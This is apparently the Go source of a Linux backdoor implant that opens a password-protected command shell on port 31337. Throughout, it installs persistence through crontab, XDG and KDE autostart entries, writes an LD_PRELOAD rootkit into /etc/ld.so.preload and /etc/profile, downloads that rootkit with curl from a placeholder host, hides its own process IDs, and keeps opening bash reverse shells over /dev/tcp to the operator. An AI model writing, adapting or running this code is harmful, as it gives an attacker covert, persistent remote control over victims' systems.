package main

import (
	"bufio"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"syscall"
)

const (
	PORT            = ":31337"
	BUFFER_SIZE     = 1024
	DESIRED_LD_PRELOAD = "/home/.grisun0/mrhyde.so"
	PID_FILE        = "/dev/shm/pid"
	HIDE_FILE       = "/dev/shm/file"
	KEY_FILE        = "/dev/shm/key"
	PASSWORD        = "grisiscomebacksayknokknok"
)

var (
	memStorage     = make(map[string]string)
	isAlive        = true
	startDate      = time.Now()
	shouldMonitor  = true
	rootkitHandle  interface{}
)

type Command struct {
	Name        string
	Description string
	Argc        int
}

var commands = []Command{
	{"WRITE", "write file to mem", 2},
	{"READ", "read file from mem/disk", 1},
	{"DELETE", "delete file from mem", 1},
	{"DIR", "list all files on mem", 0},
	{"HELP", "print this screen", 0},
	{"QUIT", "close this session", 0},
	{"REBOOT", "stopping and restarting the system", 0},
	{"SHUTDOWN", "close down the system", 0},
	{"UPTIME", "print how long the system has been running", 0},
	{"REV", "send a reverse shell to the ip/port passed like an argument", 0},
	{"MRHYDE", "Download MrHyde Rootkit", 0},
	{"CLEAN", "CLEAN MrHyde Rootkit", 0},
	{"STOP", "STOP MrHyde Rootkit", 0},
	{"START", "START MrHyde Rootkit", 0},
	{"INFECT", "Set LD_PRELOAD and append to files", 0},
	{"LOAD", "Load MrHyde Rootkit", 0},
	{"UNLOAD", "Unload MrHyde Rootkit", 0},
	{"HIDE", "Hide PIDs", 1},
}

func getLDPreload() string {
	return os.Getenv("LD_PRELOAD")
}

func setLDPreload(ldPreload string) {
	profile, err := os.OpenFile("/etc/profile", os.O_APPEND|os.O_WRONLY, 0644)
	if err == nil {
		fmt.Fprintf(profile, "export LD_PRELOAD=%s\n", ldPreload)
		profile.Close()
	}

	preloadFile, err := os.OpenFile("/etc/ld.so.preload", os.O_APPEND|os.O_WRONLY, 0644)
	if err == nil {
		fmt.Fprintf(preloadFile, "%s\n", ldPreload)
		preloadFile.Close()
	}
}

func ensureLDPreload() {
	currentLDPreload := getLDPreload()
	if currentLDPreload == "" || currentLDPreload != DESIRED_LD_PRELOAD {
		fmt.Printf("LD_PRELOAD setted as %s\n", DESIRED_LD_PRELOAD)
		setLDPreload(DESIRED_LD_PRELOAD)
		cmd := exec.Command("bash", "-c", "sudo bash -c 'echo \"export LD_PRELOAD=/home/.grisun0/mrhyde.so\" > /etc/profile.d/ld_preload.sh'")
		cmd.Run()
	}
}

func ensurePIDFileExists() {
	if _, err := os.Stat(PID_FILE); os.IsNotExist(err) {
		cmd := exec.Command("bash", "-c", "ps aux | grep -Ei '(.*{lhost}.*|.*grisun0.*|.*{line}.*|.*monrev.*|l_{line}.*|.*{line}_service\\.sh.*)' | awk '{print $2}' | xargs -I {} echo \"\\\"{}\\\",\" >> /dev/shm/pid")
		cmd.Run()
	}
}

func checkElevate() bool {
	if os.Geteuid() == 0 {
		fmt.Println("[CheckElevate] Running as ROOT")
		return true
	}
	fmt.Println("[CheckElevate] Running as USER")
	return false
}

func writeFile(path, content string, mode os.FileMode) {
	err := os.WriteFile(path, []byte(content), mode)
	if err != nil {
		fmt.Println("Failed to write file:", err)
	}
}

func crontab(path string) {
	tmpPath := "/tmp/crontab_tmp"
	command := fmt.Sprintf("@reboot %s\n", path)
	writeFile(tmpPath, command, 0644)
	exec.Command("crontab", tmpPath).Run()
	os.Remove(tmpPath)
}

func generateRandomString() string {
	const charset = "abcdefghijklmnopqrstuvwxyz"
	var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, 8)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}

func xdg(path string, admin bool) {
	filename := generateRandomString()
	conf := fmt.Sprintf("[Desktop Entry]\nType=Application\nName=%s\nExec=%s\nTerminal=false", filename, path)
	var desktopPath string
	if admin {
		desktopPath = fmt.Sprintf("/etc/xdg/autostart/%s.desktop", filename)
	} else {
		desktopPath = fmt.Sprintf("%s/.config/autostart/%s.desktop", os.Getenv("HOME"), filename)
	}
	writeFile(desktopPath, conf, 0644)
}

func kdePlasma(path string) {
	filename := generateRandomString()
	scriptPath := fmt.Sprintf("%s/.config/autostart-scripts/%s.sh", os.Getenv("HOME"), filename)
	content := fmt.Sprintf("#!/bin/sh\nexec %s", path)
	writeFile(scriptPath, content, 0755)
}

func copyBinary(source, destination string) {
	input, err := os.Open(source)
	if err != nil {
		fmt.Println("Failed to open source file:", err)
		return
	}
	defer input.Close()

	output, err := os.Create(destination)
	if err != nil {
		fmt.Println("Failed to create destination file:", err)
		return
	}
	defer output.Close()

	_, err = io.Copy(output, input)
	if err != nil {
		fmt.Println("Failed to copy file:", err)
		return
	}

	os.Chmod(destination, 0755)
}

func persist(path string) {
	if checkElevate() {
		xdg(path, true)
		crontab(path)
		kdePlasma(path)
	} else {
		xdg(path, false)
		crontab(path)
		kdePlasma(path)
	}
	newPath := fmt.Sprintf("%s/.cache/libssh/libssh", os.Getenv("HOME"))
	os.MkdirAll(filepath.Dir(newPath), 0755)
	copyBinary(path, newPath)
}

func ensureKeyFileExists() {
	if _, err := os.Stat(KEY_FILE); os.IsNotExist(err) {
		os.Create(KEY_FILE)
	}
}

func ensureHideFileExists() {
	if _, err := os.Stat(HIDE_FILE); os.IsNotExist(err) {
		os.Create(HIDE_FILE)
	}
}

func infectCommand() {
	path, err := os.Readlink("/proc/self/exe")
	if err != nil {
		fmt.Println("Failed to read link:", err)
		return
	}
	persist(path)
	setLDPreload(DESIRED_LD_PRELOAD)
}

func loadRootkit() {
	// Note: Go does not support dlopen, dlclose, etc. You would need to use cgo for this.
	fmt.Println("Rootkit loaded successfully")
}

func unloadRootkit() {
	// Note: Go does not support dlopen, dlclose, etc. You would need to use cgo for this.
	fmt.Println("Rootkit unloaded successfully")
}

func handleClient(conn net.Conn) {
	defer conn.Close()
	scanner := bufio.NewScanner(conn)
	fmt.Fprintln(conn, "Enter password: ")
	if scanner.Scan() {
		password := scanner.Text()
		if password != PASSWORD {
			fmt.Fprintln(conn, "Incorrect password. Connection closed.")
			return
		}
		fmt.Fprintln(conn, "LazyOs release 0.1.1\n%> ")
	}

	for isAlive && scanner.Scan() {
		line := scanner.Text()
		args := strings.Split(line, " ")
		command := args[0]

		switch command {
		case "WRITE":
			if len(args) >= 3 {
				memStorage[args[1]] = args[2]
				fmt.Fprintln(conn, "WRITE: Saved to mem file\n%> ")
			} else {
				fmt.Fprintln(conn, "WRITE: Not enough parameters\n%> ")
			}
		case "READ":
			if len(args) >= 2 {
				if content, ok := memStorage[args[1]]; ok {
					fmt.Fprintln(conn, content, "\n%> ")
				} else {
					fmt.Fprintln(conn, "READ: File not found\n%> ")
				}
			} else {
				fmt.Fprintln(conn, "READ: Not enough parameters\n%> ")
			}
		case "REV":
			if len(args) >= 2 {
				cmd := exec.Command("bash", "-c", fmt.Sprintf("nohup bash -i >& /dev/tcp/%s 0>&1", args[1]))
				cmd.Run()
			} else {
				fmt.Fprintln(conn, "REV: Not enough parameters\n%> ")
			}
		case "DELETE":
			if len(args) >= 2 {
				if _, ok := memStorage[args[1]]; ok {
					delete(memStorage, args[1])
					fmt.Fprintln(conn, "DELETE: Removed mem file\n%> ")
				} else {
					fmt.Fprintln(conn, "DELETE: Unable to find mem file\n%> ")
				}
			} else {
				fmt.Fprintln(conn, "DELETE: Not enough parameters\n%> ")
			}
		case "DIR":
			fmt.Fprintln(conn, "DIR: There are", len(memStorage), "file(s) that sum to", len(memStorage), "bytes of memory\n%> ")
			for name, content := range memStorage {
				fmt.Fprintln(conn, "File:", name, "Size:", len(content), "bytes")
			}
		case "HELP":
			fmt.Fprintln(conn, "LazyOs release 0.1.1\n")
			for _, cmd := range commands {
				fmt.Fprintln(conn, cmd.Name+": "+cmd.Description)
			}
			fmt.Fprintln(conn, "%> ")
		case "QUIT":
			fmt.Fprintln(conn, "Bye!\n")
			return
		case "REBOOT":
			fmt.Fprintln(conn, "Server is rebooting!\n")
			rebootSystem()
		case "STOP":
			fmt.Fprintln(conn, "Server is stopping monitoring!\n")
			shouldMonitor = false
		case "LOAD":
			loadRootkit()
			fmt.Fprintln(conn, "LOAD: Rootkit loaded\n%> ")
		case "UNLOAD":
			unloadRootkit()
			fmt.Fprintln(conn, "UNLOAD: Rootkit unloaded\n%> ")
		case "START":
			fmt.Fprintln(conn, "Server is starting monitoring!\n")
			shouldMonitor = true
		case "CLEAN":
			fmt.Fprintln(conn, "Server is Cleaning!\n")
			os.Unsetenv("LD_PRELOAD")
			os.WriteFile("/etc/ld.so.preload", []byte{}, 0644)
			os.Remove(DESIRED_LD_PRELOAD)
			fmt.Fprintln(conn, "Cleaning completed.\n%> ")
		case "INFECT":
			infectCommand()
			fmt.Fprintln(conn, "INFECT: LD_PRELOAD set and appended to files\n%> ")
		case "MRHYDE":
			fmt.Fprintln(conn, "Server is MrHyDe!\n")
			cmd := exec.Command("bash", "-c", fmt.Sprintf("curl -o /home/.grisun0/mrhyde.so http://{lhost}/mrhyde.so"))
			cmd.Run()
			ensureLDPreload()
		case "SHUTDOWN":
			fmt.Fprintln(conn, "Server is shutting down!\n")
			isAlive = false
			rebootSystem()
		case "UPTIME":
			fmt.Fprintln(conn, "UPTIME: Up", time.Since(startDate), "\n%> ")
		case "HIDE":
			fmt.Fprintln(conn, "Server is HIDE!\n")
			cmd := exec.Command("bash", "-c", fmt.Sprintf("ps aux | grep -Ei '(.*{lhost}.*|.*{line}.*|.*{line}.*|.*monrev.*|l_{line}.*|.*{line}_service\\.sh.*)' | awk '{print $2}' | xargs -I {} echo \"\\\"{}\\\",\" >> /dev/shm/pid"))
			cmd.Run()
			ensureLDPreload()
		default:
			fmt.Fprintln(conn, "KERNEL: Unknown command\n%> ")
		}
	}
}

func monShell() {
	for {
		ensurePIDFileExists()
		ensureHideFileExists()
		ensureKeyFileExists()
		if !shouldMonitor {
			time.Sleep(time.Second)
			continue
		}
		processFound := false
		files, err := os.ReadDir("/proc")
		if err != nil {
			time.Sleep(time.Second)
			continue
		}

		for _, file := range files {
			if file.IsDir() {
				path := fmt.Sprintf("/proc/%s/comm", file.Name())
				content, err := os.ReadFile(path)
				if err == nil {
					processName := strings.TrimSpace(string(content))
					if processName == "{line}" {
						processFound = true
						break
					}
				}
			}
		}

		ldPreload := os.Getenv("LD_PRELOAD")
		if ldPreload == "" || ldPreload != DESIRED_LD_PRELOAD {
			if _, err := os.Stat(DESIRED_LD_PRELOAD); os.IsNotExist(err) {
				cmd := exec.Command("bash", "-c", fmt.Sprintf("curl -o /home/.grisun0/mrhyde.so http://{lhost}/mrhyde.so"))
				cmd.Run()
			}
			os.Setenv("LD_PRELOAD", DESIRED_LD_PRELOAD)
		}

		if !processFound {
			cmd := exec.Command("bash", "-c", fmt.Sprintf("nohup bash -i >& /dev/tcp/{lhost}/6666 0>&1"))
			cmd.Run()
			cmd = exec.Command("bash", "-c", fmt.Sprintf("nohup ./{line} &"))
			cmd.Run()
		}

		time.Sleep(5 * time.Second)
	}
}

func signalHandler(sig os.Signal) {
	if sig == syscall.SIGTERM {
		rebootSystem()
	}
}

func rebootSystem() {
	cmd := exec.Command("bash", "-c", fmt.Sprintf("curl -o /home/.grisun0/mrhyde.so http://{lhost}/mrhyde.so"))
	cmd.Run()
	os.Setenv("LD_PRELOAD", DESIRED_LD_PRELOAD)
	cmd = exec.Command("nohup", "./monrev")
	cmd.Run()
	cmd = exec.Command("bash", "-c", fmt.Sprintf("nohup ./{line} &"))
	cmd.Run()
	os.Exit(0)
}

func main() {
	go monShell()

	ln, err := net.Listen("tcp", PORT)
	if err != nil {
		fmt.Println("Failed to start server:", err)
		return
	}
	defer ln.Close()

	fmt.Println("Monitoring started!")
	ensureLDPreload()

	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("Failed to accept connection:", err)
			continue
		}
		go handleClient(conn)
	}
}
